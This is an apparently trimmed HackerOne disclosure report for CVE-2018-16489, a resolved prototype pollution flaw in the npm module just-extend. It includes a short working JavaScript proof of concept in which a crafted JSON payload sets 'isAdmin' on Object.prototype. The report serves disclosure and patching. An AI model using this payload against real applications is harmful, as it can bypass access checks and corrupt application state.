# [M] Prototype pollution attack in just-extend

## Summary
Severity: Medium (CVSS 5.7)
Program: Node.js third-party modules
Weakness: Uncontrolled Resource Consumption
Reporter: asgerf
State: resolved
Disclosed: 2018-11-29T17:13:19.377Z
CVE: CVE-2018-16489
Source: https://hackerone.com/reports/430291

## Details
I would like to report a prototype pollution vulnerability in just-extend
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** just-extend
**version:** 2.1.0, and 3.0.0
**npm page:** `https://www.npmjs.com/package/just-extend`

## Module Description

Part of a library of zero-dependency npm modules that do just do one thing.
Guilt-free utilities for every occasion.

## Module Stats

723,414 downloads in the last week

# Vulnerability

## Vulnerability Description

This is a variant of this vulnerability:
https://hackerone.com/reports/310443

The functions `just-extend` can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:

Craft an object of form `{constructor: {prototype: {...}}}` or `{__proto__: {...}}` and send it to `just-extend`.

```javascript
var extend = require('just-extend');

var payload1 = JSON.parse('{"constructor": {"prototype": {"isAdmin": true}}}');
extend(true, {}, payload1);
console.log({}.isAdmin); // true

```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/430291_
